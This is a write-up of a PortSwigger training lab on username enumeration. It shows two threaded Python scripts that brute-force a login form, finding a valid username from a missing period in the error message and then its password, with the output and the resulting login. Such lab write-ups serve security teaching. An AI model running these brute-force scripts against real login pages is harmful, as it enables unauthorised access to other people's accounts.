# Username enumeration via subtly different responses

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses), you'll learn: Username enumeration via subtly different responses! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-4/images/Pasted%20image%2020221221073335.png)

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-4/images/Pasted%20image%2020221221073345.png)

**Let's try to input an invalid username:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-4/images/Pasted%20image%2020221221073448.png)

When we typed an incorrect username, it'll output `Invalid username or password.`.

**Hmm... Let's try to brute force the username via a python script and see what will happened:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def fetchUsername(filename):
    listUsername = list()

    with open(filename) as fd:
        for line in fd:
            listUsername.append(line.strip())

    return listUsername

def sendRequest(url, cookie, username):
    loginData = {
        'username': username,
        'password': 'anything'
    }

    loginRequestText = requests.post(url, cookies=cookie, data=loginData).text

    if 'Invalid username or password.' not in loginRequestText:
        print(f'[+] Found user: {username}')

def main():
    url = 'https://0aae00600417467ec6e20053003100c7.web-security-academy.net/login'
    cookie = {'session': 'YSJFWoT0ornpyiDE6rqu7iTuGCDPU5lV'}

    userFileName = './auth_username.txt'
    listUsername = fetchUsername(userFileName)
    
    for username in listUsername:
        thread = Thread(target=sendRequest, args=(url, cookie, username))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# python3 enum_username.py 
[+] Found user: info
```

**Hmm... We found user `info`? Let's confirm that:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-4/images/Pasted%20image%2020221221073934.png)

Did you notice the differences between a valid username and an invalid username error output?

- `Invalid username or password.`
- `Invalid username or password`

**A valid username is missing the `.`!**

**Armed with above information, let's brute force the password via a python script:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def fetchPassword(filename):
    listPassword = list()

    with open(filename) as fd:
        for line in fd:
            listPassword.append(line.strip())

    return listPassword

def sendRequest(url, cookie, password):
    loginData = {
        'username': 'info',
        'password': password
    }

    loginRequestText = requests.post(url, cookies=cookie, data=loginData).text

    if 'Invalid username or password' not in loginRequestText:
        print(f'[+] Found password: {password}')

def main():
    url = 'https://0aae00600417467ec6e20053003100c7.web-security-academy.net/login'
    cookie = {'session': 'YSJFWoT0ornpyiDE6rqu7iTuGCDPU5lV'}

    passwordFileName = './auth_password.txt'
    listPassword = fetchPassword(passwordFileName)
    
    for password in listPassword:
        thread = Thread(target=sendRequest, args=(url, cookie, password))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# python3 enum_password.py 
[+] Found password: 159753
```

Found it!

**Let's login as user `info`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-4/images/Pasted%20image%2020221221074232.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-4/images/Pasted%20image%2020221221074238.png)

We're user `info`!

# What we've learned:

1. Username enumeration via subtly different responses